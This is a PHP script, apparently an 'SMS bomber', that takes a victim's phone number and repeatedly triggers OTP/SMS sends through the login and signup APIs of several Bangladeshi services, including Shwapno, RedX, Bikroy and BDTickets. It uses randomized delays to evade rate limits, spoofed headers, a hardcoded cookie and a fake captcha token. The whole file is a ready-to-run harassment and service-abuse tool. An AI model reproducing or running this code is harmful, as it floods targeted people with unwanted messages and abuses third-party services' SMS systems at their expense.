<?php
header('Content-Type: application/json');
set_time_limit(0); 

$phone = $_GET['phone'] ?? '';
if(empty($phone)) {
    die(json_encode(["status" => "error", "message" => "Phone number missing"]));
}

$phone_11 = (substr($phone, 0, 2) === "88") ? substr($phone, 2) : $phone;
$phone_plus88 = "+88" . $phone_11;

// কমন রিকোয়েস্ট ফাংশন
function execute_request($url, $method = 'POST', $data = [], $headers = [], $custom_sleep = 0) {
    sleep($custom_sleep > 0 ? $custom_sleep : rand(4, 6));
    $ch = curl_init();
    
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_CUSTOMREQUEST => $method,
        CURLOPT_POSTFIELDS => is_array($data) ? json_encode($data) : $data,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_FOLLOWLOCATION => true
    ]);
    
    $res = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);
    return ["status" => $info['http_code'], "response" => json_decode($res, true) ?: $res];
}

$results = [];

// ১. Shwapno (৫ বার - নতুন)
for($i=1; $i<=5; $i++){
    $results["shwapno_$i"] = execute_request('https://www.shwapno.com/api/auth', 'POST', 
        ["phoneNumber" => $phone_plus88], 
        [
            'Content-Type: application/json',
            'User-Agent: Mozilla/5.0 (Linux; Android 10)',
            'origin: https://www.shwapno.com',
            'referer: https://www.shwapno.com/',
            'cookie: cuid=98a49521-6662-498f-94eb-17d71974083f; _nc_=true; _ds_=65eb62a4452e887cd78e256b'
        ],
        rand(3, 5));
}

// ২. Garibook (৫ বার)
for($i=1; $i<=5; $i++){
    $results["garibook_$i"] = execute_request('https://api.garibookadmin.com/api/v4/user/login', 'POST', 
        ["mobile" => "+".$phone_11, "recaptcha_token" => "garibookcaptcha", "channel" => "web"], 
        ['Content-Type: application/json', 'Origin: https://garibook.com', 'Referer: https://garibook.com/'],
        rand(3, 5));
}

// ৩. Shikho (৩ বার)
for($i=1; $i<=3; $i++){
    $results["shikho_$i"] = execute_request('https://api.shikho.com/auth/v2/send/sms', 'POST', 
        ["phone" => "88".$phone_11, "type" => "student", "auth_type" => "signup"], 
        ['Content-Type: application/json', 'Referer: https://shikho.com/', 'Origin: https://shikho.com']);
}

// ৪. RedX (১০ বার)
for($i=1; $i<=10; $i++){
    $results["redx_$i"] = execute_request('https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp', 'POST', 
        ["phoneNumber" => $phone_11], ['Content-Type: application/json']);
}

// ৫. Bikroy (১০ বার)
for($i=1; $i<=10; $i++){
    $results["bikroy_$i"] = execute_request("https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$phone_11", 'GET', [], ['User-Agent: Mozilla/5.0']);
}

// ৬. PBS (৫ বার)
for($i=1; $i<=5; $i++){
    $results["pbs_$i"] = execute_request('https://apialpha.pbs.com.bd/api/OTP/generateOTP', 'POST', 
        ["userPhone" => $phone_11], ['Content-Type: application/json', 'Origin: https://pbs.com.bd']);
}

// ৭. Iqra Live (৩ বার)
for($i=1; $i<=3; $i++){
    $results["iqra_$i"] = execute_request("https://apibeta.iqra-live.com/api/v2/sent-otp/".$phone_11, 'GET', [], ['User-Agent: Mozilla/5.0']);
}

// ৮. BDTickets (১০ বার)
for($i=1; $i<=10; $i++){
    sleep(rand(6, 9)); 
    $curl = curl_init();
    curl_setopt_array($curl, [
      CURLOPT_URL => 'https://api.bdtickets.com:20100/v1/auth',
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_POST => 1,
      CURLOPT_POSTFIELDS => '{"createUserCheck":true,"phoneNumber":"'.$phone_plus88.'","applicationChannel":"WEB_APP"}',
      CURLOPT_HTTPHEADER => ['Content-Type: application/json', 'Host: api.bdtickets.com:20100', 'Origin: https://bdtickets.com', 'Referer: https://bdtickets.com/'],
    ]);
    $res = curl_exec($curl);
    $info = curl_getinfo($curl);
    curl_close($curl);
    $results["bdtickets_$i"] = ["status" => $info['http_code'], "response" => json_decode($res, true) ?: $res];
}

echo json_encode($results, JSON_PRETTY_PRINT);
?>
